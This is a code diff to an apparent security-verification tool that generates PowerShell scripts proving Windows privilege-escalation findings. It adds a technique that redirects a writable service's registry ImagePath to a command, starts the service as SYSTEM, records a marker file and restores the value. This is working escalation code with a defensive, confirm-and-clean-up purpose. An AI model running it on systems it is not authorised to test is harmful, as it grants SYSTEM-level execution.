@@ -342,6 +342,24 @@ def _ev_default(p, k):
     return p.get(k) or ""
 
 
+def _win_regkey_service(f):
+    key = _ev(f, "key")
+    svc = _ev(f, "service") or f.get("subject")
+    return {"svc": svc, "key": key} if key and svc else None
+
+
+def _b_win_regkey_service(p):
+    return f"""  # writable service registry key: redirect ImagePath to a payload, start it as SYSTEM, restore
+  $svc = {ps(p['svc'])}
+  $key = {ps(p['key'])} -replace '^HKLM\\\\', 'HKLM:\\'
+  $marker = Join-Path $script:PfRoot ("svc." + $script:PfRun)
+  if (-not (Pf-RegBackupValue $key 'ImagePath')) {{ Pf-Skip 'could not read the ImagePath value'; return }}
+  Pf-RegSet $key 'ImagePath' ('cmd.exe /c whoami /user > "' + $marker + '"') | Out-Null
+  Pf-Note "redirected the ImagePath of $svc through its registry key (the detectable event)"
+  Pf-TryStartService $svc
+  Pf-JudgeMarker ("svc." + $script:PfRun)"""
+
+
 def _win_hook_target(f):
     s = f.get("subject", "")
     if " -> " not in s:
@@ -370,6 +388,8 @@ WINDOWS: List[Technique] = [
     Technique("WIN-HOOK-TARGET", "T1546", "Overwrite a registry execution-hook target",
               {"PS-HOOK-001", "PS-HOOK-002", "PS-HOOK-003", "PS-HOOK-004", "PS-HOOK-005", "PS-HOOK-006"},
               _win_hook_target, _b_win_hook_target),
+    Technique("WIN-REGKEY-SERVICE", "T1574.011", "Redirect a service via its writable registry key",
+              {"PS-REGK-001"}, _win_regkey_service, _b_win_regkey_service),
 ]
 
 
@@ -588,7 +608,7 @@ $script:PfWork = Join-Path $env:TEMP ("pf-" + $script:PfRun)
 $script:PfWait = $WaitSeconds
 New-Item -ItemType Directory -Force $script:PfRoot, $script:PfWork | Out-Null
 $script:PfLog = Join-Path $script:PfRoot ("run-" + $script:PfRun + ".jsonl")
-$script:PfBackups = @{{}}; $script:PfFiles = @()
+$script:PfBackups = @{{}}; $script:PfFiles = @(); $script:PfRegBak = @{{}}
 $script:PfId = ''; $script:PfAttack = ''; $script:PfSubj = ''
 
 function Pf-Emit($status, $detail) {{
@@ -600,6 +620,8 @@ function Pf-Record($s, $m) {{ Write-Host "    = ${{s}}: $m"; Pf-Emit $s $m }}
 function Pf-Skip($m)   {{ Pf-Record skipped $m }}
 function Pf-TrackFile($p) {{ $script:PfFiles += $p }}
 function Pf-Backup($p) {{ if (-not (Test-Path -LiteralPath $p)) {{ return $false }}; $b = Join-Path $script:PfWork ([IO.Path]::GetRandomFileName()); Copy-Item -LiteralPath $p $b -Force -ErrorAction SilentlyContinue; if ($?) {{ $script:PfBackups[$p]=$b; return $true }}; return $false }}
+function Pf-RegBackupValue($key, $name) {{ try {{ $script:PfRegBak["$key|$name"] = (Get-ItemProperty -LiteralPath $key -Name $name -ErrorAction Stop).$name; return $true }} catch {{ return $false }} }}
+function Pf-RegSet($key, $name, $value) {{ try {{ Set-ItemProperty -LiteralPath $key -Name $name -Value $value -ErrorAction Stop; return $true }} catch {{ return $false }} }}
 function Pf-RestoreNow($p) {{ if ($script:PfBackups.ContainsKey($p)) {{ Copy-Item $script:PfBackups[$p] $p -Force -ErrorAction SilentlyContinue }} }}
 function Pf-WriteMarkerFile($p, $t) {{ Set-Content -LiteralPath $p -Value $t -Encoding ascii -ErrorAction SilentlyContinue }}
 function Pf-WritePayloadExe($p) {{
@@ -648,6 +670,7 @@ function Pf-BuildProofMsi($path) {{
 function Pf-Cleanup {{
   foreach ($p in $script:PfBackups.Keys) {{ Copy-Item $script:PfBackups[$p] $p -Force -ErrorAction SilentlyContinue }}
   foreach ($f in $script:PfFiles) {{ Remove-Item $f -Force -ErrorAction SilentlyContinue }}
+  foreach ($kv in $script:PfRegBak.Keys) {{ $parts = $kv -split '\|', 2; try {{ Set-ItemProperty -LiteralPath $parts[0] -Name $parts[1] -Value $script:PfRegBak[$kv] -ErrorAction SilentlyContinue }} catch {{}} }}
   Remove-Item $script:PfWork -Recurse -Force -ErrorAction SilentlyContinue
   Write-Host "[*] restored backups and cleaned up; log: $script:PfLog"
 }}
